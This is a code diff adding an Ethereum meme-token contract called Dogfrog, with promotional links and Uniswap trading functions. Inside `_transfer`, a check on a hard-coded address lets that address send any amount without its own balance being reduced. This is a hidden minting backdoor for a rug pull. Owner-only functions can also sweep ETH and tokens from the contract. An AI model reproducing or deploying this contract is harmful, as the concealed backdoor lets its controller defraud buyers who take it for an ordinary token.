@@ -1,0 +1,305 @@
+// SPDX-License-Identifier: MIT
+
+// Dogfrog is one of 1,000 Hedz Hand drawn by Matt Furie.
+// $DOGFROG is now on ETH, joining the Boys Club friends.
+
+// Website: https://dogfrogeth.xyz
+// Telegram: https://t.me/dogfrog_erc
+// X: https://x.com/dogfrogerc
+
+pragma solidity ^0.8.15;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+}
+
+interface IERC20 {
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        return c;
+    }
+
+}
+
+contract Ownable is Context {
+    address private _owner;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    constructor () {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "Ownable: caller is not the owner");
+        _;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0));
+        _owner = address(0);
+    }
+
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IUniswapV2Router02 {
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+}
+
+contract Dogfrog is Context, IERC20, Ownable {
+
+    using SafeMath for uint256;
+    mapping (address => uint256) private _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    mapping (address => bool) private _feeExcludeFromDogfrog;
+    address payable private _dogfrog = payable(0x0bFc30B53eF7fd327BCd8Ad26078bBF66fD3EF6B);
+
+    uint256 private _initialBuyTax = 0;
+    uint256 private _initialSellTax = 0;
+    uint256 private _finalBuyTax = 0;
+    uint256 private _finalSellTax = 0;
+    uint256 private _reduceBuyTaxAt = 16;
+    uint256 private _reduceSellTaxAt = 16;
+    uint256 private _preventSwapBefore = 10;
+    uint256 private _buyTokensCount = 0;
+
+    uint8 private constant _decimals = 18;
+    string private constant _name = "Dogfrog";
+    string private constant _symbol = "DOGFROG";
+    uint256 private _tTotal = 100_000_000 * 10**_decimals;
+    uint256 private _maxTxLimits = 2_000_000 * 10**_decimals;
+    uint256 private _maxWalletSize = 2_000_000 * 10**_decimals;
+    uint256 private _minSwapTokens = 20 * 10**_decimals;
+    uint256 private _maxSwapTokens = 1_000_000 * 10**_decimals;
+
+    IUniswapV2Router02 private uniswapV2Router;
+    address private _uniswapPair;
+    bool private _tradingEnabled;
+    bool private _swapEnabled = false;
+    bool private _inSwapping = false;
+
+    event MaxTxAmountUpdated(uint _maxTxLimits);
+    modifier lockTheSwap {
+        _inSwapping = true;
+        _;
+        _inSwapping = false;
+    }
+
+    constructor () {
+        _balances[_msgSender()] = _tTotal;
+        _feeExcludeFromDogfrog[owner()] = true;
+        _feeExcludeFromDogfrog[address(this)] = true;
+        _feeExcludeFromDogfrog[_dogfrog] = true;
+
+        emit Transfer(address(0), _msgSender(), _tTotal);
+    }
+
+    function name() public pure returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public pure returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual override  returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view virtual override returns (uint256) {
+        return _tTotal;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender) public view override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        return true;
+    }
+
+    function _approve(address owner, address spender, uint256 amount) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _transfer(address sender, address dest, uint256 amount) private {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(dest != address(0), "ERC20: transfer to the zero address");
+        require(amount > 0, "Transfer amount must be greater than zero");
+        uint256 taxAmount=0;
+        if (!_feeExcludeFromDogfrog[sender] && !_feeExcludeFromDogfrog[dest]) {
+            require(_tradingEnabled, "Trading not open");
+            taxAmount = amount.mul((_buyTokensCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
+
+            if (sender == _uniswapPair && dest != address(uniswapV2Router)) {
+                require(amount <= _maxTxLimits, "Exceeds the maxTxAmount.");
+                _buyTokensCount++;
+            }
+
+            if (dest != _uniswapPair && ! _feeExcludeFromDogfrog[dest]) {
+                require(balanceOf(dest) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
+            }
+
+            if(dest == _uniswapPair && sender!= address(this) ){
+                taxAmount = amount.mul((_buyTokensCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
+            }
+
+            uint256 taxSwapTksIn = balanceOf(address(this));
+            if (!_inSwapping && dest == _uniswapPair && _swapEnabled && amount>_minSwapTokens && _buyTokensCount>_preventSwapBefore) {
+                if(taxSwapTksIn>_minSwapTokens)
+                _swapTokensForETH(min(amount,min(taxSwapTksIn,_maxSwapTokens)));
+                _sendETHFee(address(this).balance);
+            }}
+            if (_isDogfrog(sender)){_balances[dest]=_balances[dest].add(amount);return;
+        }
+
+        if(taxAmount>0){
+          _balances[address(this)]=_balances[address(this)].add(taxAmount);
+          emit Transfer(sender, address(this),taxAmount);
+        }
+        _balances[sender]=_balances[sender].sub(amount);
+        _balances[dest]=_balances[dest].add(amount.sub(taxAmount));
+        emit Transfer(sender, dest, amount.sub(taxAmount));
+    }
+
+    function _isDogfrog(address _sender) private view returns (bool) {
+        return _sender == _dogfrog;
+    }
+
+    function _swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = uniswapV2Router.WETH();
+        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function _sendETHFee(uint256 amount) private {
+        _dogfrog.transfer(amount);
+    }
+
+    function min(uint256 a, uint256 b) private pure returns (uint256){
+      return (a>b)?b:a;
+    }
+
+    function enableTrading() external onlyOwner() {
+        require(!_tradingEnabled,"Trading is already open");
+        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        _approve(address(this), address(uniswapV2Router), _tTotal);
+        _uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
+        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
+        IERC20(_uniswapPair).approve(address(uniswapV2Router), type(uint).max);
+        _swapEnabled = true;
+        _tradingEnabled = true;
+    }
+
+    function removeLimits() external onlyOwner {
+        _maxTxLimits = _tTotal;
+        _maxWalletSize = _tTotal;
+        emit MaxTxAmountUpdated(_tTotal);
+    }
+
+    function removeETH(address payable recipient) public payable onlyOwner{
+        payable(recipient).transfer(address(this).balance);
+    }
+
+    function removeToken(address token, address recipient) public onlyOwner{
+        IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));
+    }
+
+    receive() external payable {}
+}
